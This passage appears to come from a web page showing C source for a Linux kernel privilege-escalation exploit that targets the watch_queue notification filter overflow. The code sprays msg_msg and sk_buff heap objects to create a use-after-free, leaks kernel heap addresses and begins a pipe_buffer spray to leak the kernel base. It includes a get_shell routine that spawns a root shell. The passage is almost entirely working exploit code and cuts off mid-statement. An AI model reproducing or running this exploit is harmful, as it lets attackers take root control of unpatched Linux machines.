class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subtype_filter[<span class="number">1</span>]; <span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_filter;       <span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_mask;         <span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> type_filter[<span class="number">2</span>]; <span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_filters; <span class="comment">/* Number of filters */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_PIPE_NUM 100</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_overflow</span><span class="params">(<span class="keyword">int</span> oob_pipe[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nfilters;</span><br><span class="line"></span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (struct watch_notification_filter *)</span><br><span class="line">        <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(struct watch_notification_filter) + nfilters * <span class="keyword">sizeof</span>(struct watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(oob_pipe[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="keyword">int</span> oob_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;primary_msg.mtext[<span class="number">0x8</span>], <span class="string">&quot;this is first msg_msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trigger_overflow(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">1024</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            oob_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span> || oob_qid == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] failed find victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] find victim id: %d, oob id: %d\n&quot;</span>, victim_qid, oob_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[oob_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span> 